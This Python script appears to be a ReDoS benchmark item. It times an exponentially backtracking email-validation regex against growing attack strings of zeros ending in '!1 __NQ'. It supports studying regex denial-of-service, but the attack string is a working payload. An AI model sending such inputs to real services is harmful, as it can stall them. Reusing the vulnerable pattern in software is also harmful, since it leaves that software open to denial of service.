# 3500
# ^([0-9a-zA-Z]+(?:[_\.\-]?[0-9a-zA-Z]+)*[@](?:[0-9a-zA-Z]+(?:[_\.\-]?[0-9a-zA-Z]+)*\.[a-zA-Z]{2,}|(?:\d{1,}\.){3}\d{1,}))$
# EXPONENT
# nums:4
# EXPONENT AttackString:"0"+"0"*32+"!1 __NQ"

import re
from time import perf_counter

regex = """^([0-9a-zA-Z]+(?:[_\.\-]?[0-9a-zA-Z]+)*[@](?:[0-9a-zA-Z]+(?:[_\.\-]?[0-9a-zA-Z]+)*\.[a-zA-Z]{2,}|(?:\d{1,}\.){3}\d{1,}))$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "0" + "0" * i * 1 + "!1 __NQ"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")